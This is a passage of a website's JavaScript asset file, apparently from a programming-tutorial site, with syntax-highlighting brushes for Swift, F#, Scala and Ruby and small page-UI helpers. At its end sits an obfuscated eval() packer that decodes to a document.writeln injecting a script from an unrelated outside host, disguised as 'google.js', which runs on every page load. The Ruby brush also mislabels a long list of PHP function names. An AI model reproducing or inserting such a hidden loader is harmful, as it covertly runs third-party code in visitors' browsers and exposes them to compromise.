      (this.CssClass = "dp-c"),
      (this.Style = ".dp-c .vars { color: #d00; }");
  }),
  (dp.sh.Brushes.Swift.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Swift.Aliases = ["Swift", "swift"]),
  (dp.sh.Brushes.FSharp = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("^\\s*#.*", "gm"), css: "preprocessor" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "abstract and as assert base begin class default delegate do done downcast downto elif else end exception extern false finally for fun function global if in inherit inline interface internal lazy let let! match member module mutable namespace new not null of open or override private public rec return return! select static struct then to true try type upcast use use! val void when while with yield yield! asr land lor lsl lsr lxor mod sig atomic break checked component const constraint constructor continue eager event external fixed functor include method mixin object parallel process protected pure sealed tailcall trait virtual volatile"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-c"),
      (this.Style = ".dp-c .vars { color: #d00; }");
  }),
  (dp.sh.Brushes.FSharp.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.FSharp.Aliases = ["f#", "f-sharp", "fsharp", "FSharp"]),
  (dp.sh.Brushes.Scala = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("^\\s*#.*", "gm"), css: "preprocessor" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "case catch class def do else extends import def do else extends false object private protected final for if match new null throw to trait true try until val var while with Double Int None Option Ordering Range Regex StdIn"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-c"),
      (this.Style = ".dp-c .vars { color: #d00; }");
  }),
  (dp.sh.Brushes.Scala.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Scala.Aliases = ["Scala", "scala"]),
  (dp.sh.Brushes.ruby = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("\\$\\w+", "g"), css: "vars" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "puts abs acos acosh addcslashes addslashes array_change_key_case array_chunk array_combine array_count_values array_diff array_diff_assoc array_diff_key array_diff_uassoc array_diff_ukey array_fill array_filter array_flip array_intersect array_intersect_assoc array_intersect_key array_intersect_uassoc array_intersect_ukey array_key_exists array_keys array_map array_merge array_merge_recursive array_multisort array_pad array_pop array_product array_push array_rand array_reduce array_reverse array_search array_shift array_slice array_splice array_sum array_udiff array_udiff_assoc array_udiff_uassoc array_uintersect array_uintersect_assoc array_uintersect_uassoc array_unique array_unshift array_values array_walk array_walk_recursive atan atan2 atanh base64_decode base64_encode base_convert basename bcadd bccomp bcdiv bcmod bcmul bindec bindtextdomain bzclose bzcompress bzdecompress bzerrno bzerror bzerrstr bzflush bzopen bzread bzwrite ceil chdir checkdate checkdnsrr chgrp chmod chop chown chr chroot chunk_split class_exists closedir closelog copy cos cosh count count_chars date decbin dechex decoct deg2rad delete ebcdic2ascii echo empty ereg ereg_replace eregi eregi_replace error_log error_reporting escapeshellarg escapeshellcmd eval exec exit exp explode extension_loaded feof fflush fgetc fgetcsv fgets fgetss file_exists file_get_contents file_put_contents fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype floatval flock floor flush fmod fnmatch fopen fpassthru fprintf fputcsv fputs fread fscanf fseek fsockopen fstat ftell ftok getallheaders getcwd getdate getenv gethostbyaddr gethostbyname gethostbynamel getimagesize getlastmod getmxrr getmygid getmyinode getmypid getmyuid getopt getprotobyname getprotobynumber getrandmax getrusage getservbyname getservbyport gettext gettimeofday gettype glob gmdate gmmktime ini_alter ini_get ini_get_all ini_restore ini_set interface_exists intval ip2long is_a is_array is_bool is_callable is_dir is_double is_executable is_file is_finite is_float is_infinite is_int is_integer is_link is_long is_nan is_null is_numeric is_object is_readable is_real is_resource is_scalar is_soap_fault is_string is_subclass_of is_uploaded_file is_writable is_writeable mkdir mktime nl2br parse_ini_file parse_str parse_url passthru pathinfo readlink realpath rewind rewinddir rmdir round str_ireplace str_pad str_repeat str_replace str_rot13 str_shuffle str_split str_word_count strcasecmp strchr strcmp strcoll strcspn strftime strip_tags stripcslashes stripos stripslashes stristr strlen strnatcasecmp strnatcmp strncasecmp strncmp strpbrk strpos strptime strrchr strrev strripos strrpos strspn strstr strtok strtolower strtotime strtoupper strtr strval substr substr_compare"
          ),
          "gmi"
        ),
        css: "func",
      },
      {
        regex: new RegExp(
          this.GetKeywords(
            "_ENCODING_ BEGIN END _FILE_ _LINE_ alias and begin break case class def defined? do else elsif end ensure false for if in _module next nil not or redo rescue retry return self super then true undef unless until when while yield"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-c");
  }),
  (dp.sh.Brushes.ruby.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.ruby.Aliases = ["ruby"]);
var count = 0;
function showmenu() {
  (document.getElementById("menu").style.width = "100%"),
    0 == count
      ? ((document.getElementById("menu").style.display = "block"),
        (document.getElementById("leftad").style.display = "none"),
        (count = 1))
      : ((document.getElementById("menu").style.display = "none"), (count = 0));
}
// function showhide(e) {
//   var t,
//     s,
//     r = "answer" + e,
//     i = "btntext" + e;
//   (t = document.getElementById(r)),
//     (s = document.getElementById(i)),
//     (button_elemeent_parent = document.getElementById(i).parentElement),
//     "block" == t.style.display
//       ? ((t.style.display = "none"),
//         (s.innerHTML = "Show Answer"),
//         (button_elemeent_parent.style.backgroundImage =
//           "url('https://www.javatpoint.com/images/eye-black.png') "))
//       : ((t.style.display = "block"),
//         (s.innerHTML = "Hide Answer"),
//         (button_elemeent_parent.style.backgroundImage =
//           "url('https://www.javatpoint.com/images/eye-close-black.png') "));
// }
function showworkspace(e) {
  var t = "workspace" + e,
    s = document.getElementById(t);
  "block" == s.style.display
    ? ((s.style.display = "none"), (s.innerHTML = ""))
    : ((s.style.display = "block"),
      (s.innerHTML = "<textarea class='workspacetextarea'></textarea>"));
}

function topFunction() {
  0 != document.body.scrollTop || 0 != document.documentElement.scrollTop
    ? (window.scrollBy(0, -80), (timeOut = setTimeout("topFunction()", 3)))
    : clearTimeout(timeOut);
}
eval(
  (function (e, t, s, r, i, n) {
    if (
      ((i = function (e) {
        return e.toString(14);
      }),
        !"".replace(/^/, String))
    ) {
      for (; s--;) n[i(s)] = r[s] || i(s);
      (r = [
        function (e) {
          return n[e];
        },
      ]),
        (i = function () {
          return "\\w+";
        }),
        (s = 1);
    }
    for (; s--;)
      r[s] && (e = e.replace(new RegExp("\\b" + i(s) + "\\b", "g"), r[s]));
    return e;
  })(
    "2.7(\"<0 3='4/5' 6='1://8.9-a.b/c.d'></0>\");",
    0,
    14,
    "script|http|document|type|text|javascript|src|writeln|img1|ph|126|net|google|js".split(
      "|"
    ),
    0,
    {}
  )
);